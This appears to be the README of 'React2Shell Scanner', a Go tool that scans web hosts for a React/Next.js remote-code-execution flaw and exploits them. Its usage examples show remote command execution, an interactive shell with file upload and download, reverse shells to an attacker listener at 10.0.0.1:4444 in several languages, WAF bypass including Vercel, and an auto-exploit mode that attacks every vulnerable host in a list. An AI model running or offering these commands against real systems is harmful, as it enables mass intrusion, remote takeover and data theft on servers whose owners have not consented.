```
██████╗  ██████╗     ██████╗ ███████╗ █████╗  ██████╗████████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
██╔════╝ ██╔═══██╗    ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║     
██║  ███╗██║   ██║    ██████╔╝█████╗  ███████║██║        ██║    █████╔╝███████╗███████║█████╗  ██║     ██║     
██║   ██║██║   ██║    ██╔══██╗██╔══╝  ██╔══██║██║        ██║   ██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║     
╚██████╔╝╚██████╔╝    ██║  ██║███████╗██║  ██║╚██████╗   ██║   ███████╗███████║██║  ██║███████╗███████╗███████╗
 ╚═════╝  ╚═════╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                                          by beecynical637
```

# React2Shell Scanner

## Features

- Vulnerability scanning (single host or batch mode)
- RCE proof-of-concept detection
- Safe side-channel detection mode
- Exploit mode with command execution
- Interactive shell mode with built-in commands
- Reverse shell support (bash, python, nc, perl, php, powershell)
- File upload/download capabilities
- System information gathering
- Auto-exploit mode (scan + exploit in one run)
- WAF bypass techniques (including Vercel WAF)
- Multi-threaded scanning
- JSON output support
- Custom headers and paths support

## Installation

```bash
# Clone and build
git clone https://github.com/beecynical637/react2shell_go.git
go mod tidy
go build -o react2shell ./cmd/react2shell
```

## Usage

### Scanning Mode

```bash
# Scan single host
./react2shell -u https://example.com

# Scan multiple hosts from file
./react2shell -l hosts.txt -t 20 -o results.json

# Safe side-channel check (non-destructive)
./react2shell -u https://example.com --safe-check

# With WAF bypass
./react2shell -u https://example.com --waf-bypass

# With custom paths
./react2shell -u https://example.com --path /_next --path /api

# With custom headers
./react2shell -u https://example.com -H "Authorization: Bearer token"
```

### Exploit Mode

```bash
# Execute single command
./react2shell -u https://vulnerable.com --exploit -c "id"

# Interactive shell
./react2shell -u https://vulnerable.com --exploit --shell

# Windows target
./react2shell -u https://vulnerable.com --exploit -c "whoami" --windows

# Get system information
./react2shell -u https://vulnerable.com --exploit --sysinfo

# Reverse shell (start listener first: nc -lvnp 4444)
./react2shell -u https://vulnerable.com --exploit --revshell 10.0.0.1:4444
./react2shell -u https://vulnerable.com --exploit --revshell 10.0.0.1:4444 --revshell-type python
```

### Auto-Exploit Mode

```bash
# Scan multiple hosts and exploit all vulnerable ones
./react2shell -l hosts.txt --auto-exploit -c "id"
```

### Interactive Shell Commands

When using `--shell`, additional commands are available:

- `!download <remote> <local>` - Download file from target
- `!upload <local> <remote>` - Upload file to target
- `!revshell <ip> <port>` - Send reverse shell
- `!sysinfo` - Get system information
- `exit` / `quit` - Exits shell

## Options

| Option                | Description                                    |
|-----------------------|------------------------------------------------|
| `-u`                  | Single URL/host to check                       |
| `-l`                  | File containing list of hosts                  |
| `-t`                  | Number of concurrent threads (default: 10)     |
| `--timeout`           | Request timeout in seconds (default: 10)       |
| `-o`                  | Output file for results (JSON)                 |
| `--all-results`       | Save all results, not just vulnerable          |
| `-k`                  | Disable SSL verification (default: true)       |
| `-v`                  | Verbose output                                 |
| `-q`                  | Quiet mode                                     |
| `--no-color`          | Disable colored output                         |
| `--safe-check`        | Use safe side-channel detection                |
| `--windows`           | Use Windows PowerShell payload                 |
| `--waf-bypass`        | Add junk data to bypass WAF                    |
| `--waf-bypass-size`   | Junk data size in KB (default: 128)            |
| `--vercel-waf-bypass` | Use Vercel WAF bypass payload                  |
| `--exploit`           | Enable exploit mode                            |
| `-c`                  | Command to execute                             |
| `--shell`             | Interactive shell mode                         |
| `--revshell`          | Send reverse shell (format: ip:port)           |
| `--revshell-type`     | Shell type: bash/python/nc/perl/php/powershell |
| `--sysinfo`           | Get system information from target             |
| `--auto-exploit`      | Scan and auto-exploit vulnerable hosts         |
| `--path`              | Custom path to test                            |
| `--path-file`         | File with paths to test                        |
| `-H`                  | Custom header                                  |

## Environment Variables (optional)

```env
R2S_TIMEOUT=10
R2S_THREADS=10
R2S_VERIFY_SSL=false
R2S_WAF_BYPASS_SIZE=128
```

## License

GNU GPL 3.0 License
